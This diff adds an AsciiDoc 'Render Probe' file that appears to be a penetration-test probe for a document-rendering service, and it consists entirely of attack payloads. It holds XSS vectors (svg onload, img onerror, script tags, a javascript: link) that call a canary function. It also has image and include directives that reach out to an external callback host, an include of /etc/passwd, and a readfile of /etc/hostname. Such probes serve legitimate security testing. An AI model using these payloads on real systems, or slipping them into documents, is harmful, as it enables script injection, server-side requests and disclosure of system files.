@@ -1,0 +1,23 @@
+= Render Probe
+:backend: html5
+
+pass:[<svg onload="window.__forgeXssHit('FORGE_XSS_401e7c23f058af34464e3f340648f588')"></svg>]
+
++++<img src=x onerror="window.__forgeXssHit('FORGE_XSS_401e7c23f058af34464e3f340648f588')">+++
+
+++++
+<script>window.__forgeXssHit('FORGE_XSS_401e7c23f058af34464e3f340648f588')</script>
+++++
+
+link:javascript:window.__forgeXssHit('FORGE_XSS_401e7c23f058af34464e3f340648f588')[clickme]
+
+image::http://PEN-NZUY-4251-6754.dns.collabp-reg1.devops.aws.dev/adoc-image.png[alt]
+
+include::/etc/passwd[]
+
+include::http://PEN-NZUY-4251-6754.dns.collabp-reg1.devops.aws.dev/adoc-include.adoc[]
+
+[subs="attributes"]
+----
+{readfile:/etc/hostname}
+----
